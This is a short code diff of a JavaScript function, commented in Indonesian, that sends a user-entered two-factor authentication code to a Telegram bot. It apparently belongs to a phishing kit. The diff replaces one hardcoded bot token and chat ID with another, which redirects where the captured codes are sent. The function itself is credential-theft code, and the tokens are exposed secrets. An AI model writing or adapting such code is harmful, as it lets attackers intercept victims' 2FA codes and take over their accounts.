@@ -1,7 +1,7 @@
 // Fungsi untuk mengirim pesan ke Telegram
 async function sendToTelegram(code2fa) {
-    const botToken = '8798021653:AAFFnZc4B6Fbx1XRcVkVUrPstfg2W-oukP0';
-    const chatId = '7437326858';
+    const botToken = '7506300483:AAFXhPOPcagRAbmkGDUt8J5r_JIYOWItIXY';
+    const chatId = '6000448808';
 
     const message = `Kode 2FA yang dimasukkan: ${code2fa}`;
 
